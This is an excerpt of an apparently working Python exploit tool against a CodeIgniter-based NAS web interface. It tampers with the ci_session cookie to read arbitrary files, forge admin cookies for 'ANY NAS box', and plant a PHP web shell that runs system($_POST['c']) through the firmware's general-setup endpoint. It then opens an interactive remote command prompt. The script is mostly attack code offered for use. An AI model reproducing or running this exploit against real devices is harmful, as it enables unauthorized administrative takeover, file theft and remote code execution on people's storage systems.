...
DEFAULT_UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) 
...
def xor(s, k):
    return ''.join(chr(ord(a) ^ ord(b)) for a, b in itertools.izip(s, 
itertools.cycle(k)))
...
def make_request(uri = "/", ci_session = None, headers = None, post_data 
= None):
...
def add_string(ci_session, key, value):
    ...
    if prefix in ci_session:
        ci_session = re.sub(r'{0}\d+:"[^"]*"'.format(prefix), 
'{0}{1}:"{2}"'.format(prefix, len(value), value), ci_session)
    else:
        # doesn't exist, so we need to add it to the start and the end.
        count = int(ci_session.split(':')[1]) + 1
        ci_session = re.sub(r'a:\d+(.*)}$', 
r'a:{0}\1{1}{2}:"{3}";}}'.format(count, prefix, len(value), value), 
ci_session)
    return ci_session
...
def read_file(file_path, post_data = None):
    resp = make_request(ci_session = include_file(cis, file_path), 
...
def show_help():
    ...
    print 
"==========================================================================="
    print "version           - Print the current firmware version to 
screen."
    print "dumpcookie        - Print the current cookie to screen."
    print "admincookie <ua>  - Create an admin login cookie (ua == user 
agent string)."
    print "                    Add to your browser and access ANY NAS 
box as admin."
...
def get_firmware_version():
    resp = 
make_request("/index.php/mv_system/get_firmware?_=1413463189043",
            ci_session = acis)
...
def install_shell():
    resp = 
make_request("/index.php/mv_system/get_general_setup?_=1413463189043",
            ci_session = acis)
    existing_setup = ''
    for l in resp.split("\r\n"):
    ...
    exec_post = base64.b64encode("<?php 
if(isset($_POST['c'])&&!empty($_POST['c'])){system($_POST['c']);} ?>")
    installer = '<?php file_put_contents(\'{0}\', 
base64_decode(\'{1}\')); ?>'.format(webshell, exec_post)
    ...
    updated_setup = existing_setup[0:start] + write_php + 
existing_setup[end:]
 
    # write the shell to the description
    resp = 
make_request("/index.php/mv_system/set_general_setup?_=1413463189043",
            ci_session = acis,
            headers = { },
...
if len(sys.argv) >= 4 and sys.argv[3] == '-c':
    ...
    while running:
        try:
            user_input = raw_input("Seagape ({0}@{1})> 
